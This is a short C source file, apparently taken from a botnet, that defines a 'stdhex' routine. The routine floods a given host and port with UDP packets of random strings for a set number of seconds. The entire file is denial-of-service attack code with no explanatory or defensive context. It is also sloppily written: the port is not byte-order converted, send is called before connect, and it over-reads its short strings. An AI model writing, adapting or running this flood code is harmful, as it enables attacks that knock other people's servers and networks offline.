#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>

void stdhex(char *ip, int port, int secs) {
    int iSTD_Sock;
    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        if (a >= 50) {
            char *randstrings[] = {"xo2wlpcMkwB7xl1roInS",
            "eYrwUkiMOGKfqtxF9PiQ",
            "9tGesp1yxlAafHykBlOH",
            "Zq14AOASOqGQsQKGuMVU",
            "olunvWs1U9D9Fj5Lfq80",
            "e1jJUqXQLa8sAGNOyK3a",
            "lzZbJv3MWrO7OMLDtvCD",
            "YvzVL6pVVphQBTdu23rY",
            "jy7vd6Gt6lQ2JeGccXnR",
            "q78J1jWEllMW4ORH9RrM",
            "ItpgKX7deAoof12A6ock",
            "OLMH5ke9LHyA587NewSO",
            "xk8pBuHXVZa2FwkmlbfW",
            "D3azFwP67HVehxHxn0Gv",
            "7c6dJZkkF53MtJQ40iRF",
            "yPshYIcbBvVyKMRy5pyZ",
            "53fDEesj58E2o25RIpOZ",
            "DiglluqLJvvLxGv5Bgv5",
            "zSLyeTSFrqtQJvBw5U8h",
            "2ihxJ2ZaLPz8ne2XLSMg",
            "89lOPjJju1Vk5Sn8zPoE",
            "rjOHaPss80ZDV2hQJzjU",
            "NYxDUzdCpeB35l8iswB8",
            "fH8wO63UUyMSMW5b3Oy5",
            "FiRCccq6WR0IXTkpMIJt",
            "oDU51LlaAHndskX7xyMf",
            "ICoLF8Up6T62vP7LNHVP",
            "jglGykcOrU5ObTez3kJY",
            "cgJCzPA2vcABPHxRIG6M",
            "Vu22WV6aFZblTwiEW4pg",
            "7tQrRiFKcWCKIgVoXCaM",
            "WFgMvfpzXkmUi5ThciSO",
            "5Azcj6qqebiq8Lmwmzw6",
            "A70gmCojDzqbcCm0BYQc",
            "CH5HFi8ujerugdMOtJFh",
            "tdJLBxUA8i8St0X4QH53",
            "Pt5j3eMFZLkiQx5gqRin",
            "iRCzWAibQCxeFtBqABWP",
            "kasi00QZxgZfgTqIoTxr",
            "N9zGRHQ6c8fy9a1CO8PK",
            "VXDMdbu32a6ApNW3txh6",
            "oBWTLW7qt37YwhRV6UNo",
            "Xmz2mdlVjPuRiHhRWWcM",
            "3lRaHR7rR1QHJHkHI3Ck"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(iSTD_Sock, STD2_STRING,  600, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs) {
                close(iSTD_Sock);
                return;
            }
            a = 0;
        }
        a++;
    }
}